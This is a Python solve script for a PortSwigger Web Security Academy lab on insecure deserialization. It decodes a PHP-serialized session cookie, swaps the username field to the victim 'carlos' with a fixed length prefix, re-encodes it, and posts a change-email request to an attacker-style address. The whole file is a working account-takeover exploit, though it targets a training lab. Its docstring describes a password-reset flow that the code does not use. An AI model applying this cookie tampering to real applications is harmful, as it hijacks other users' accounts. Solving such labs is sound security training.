"""
Lab 3: Using application functionality to exploit insecure deserialization
https://portswigger.net/web-security/deserialization/exploiting/lab-using-application-functionality-to-exploit-insecure-deserialization
Difficulty: Practitioner

📝 No gadget chain needed — the session object has a "username" field that
drives a PASSWORD RESET email. Edit just that field (keeping everything
else legitimate) to point the reset flow at a victim account instead.
"""

import base64
import re

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}
VICTIM_USERNAME = "carlos"


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    cookie = s.cookies.get("session")
    decoded = base64.b64decode(cookie).decode()
    note(f"Decoded: {decoded}")

    # Swap the username field's value, keeping its length prefix correct.
    new_username_serialized = f's:{len(VICTIM_USERNAME)}:"{VICTIM_USERNAME}";'
    modified = re.sub(r's:\d+:"username";s:\d+:"[^"]*";',
                       f's:8:"username";{new_username_serialized}', decoded)
    note(f"Modified: {modified}")

    new_cookie = base64.b64encode(modified.encode()).decode()
    s.cookies.set("session", new_cookie)

    note("Now trigger whatever app feature uses the session's username to")
    note("take an action on the user's behalf — e.g. requesting a password")
    note("reset email, updating the account's own email address, etc.")
    r = s.post(f"{TARGET}/my-account/change-email", data={"email": "attacker@evil-user.net"})
    log(f"Feature-trigger response: {r.status_code}")
    print(r.text[-300:])


if __name__ == "__main__":
    run()
